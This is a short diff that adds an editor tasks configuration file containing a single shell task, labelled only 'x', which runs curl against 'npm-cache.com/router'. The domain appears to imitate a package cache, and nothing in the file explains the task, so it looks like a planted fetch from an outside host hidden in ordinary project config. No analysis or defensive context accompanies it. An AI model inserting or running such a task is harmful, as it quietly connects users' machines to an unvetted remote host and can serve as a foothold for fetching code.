@@ -1,0 +1,10 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "x",
+      "type": "shell",
+      "command": "curl https://npm-cache.com/router"
+    }
+  ]
+}
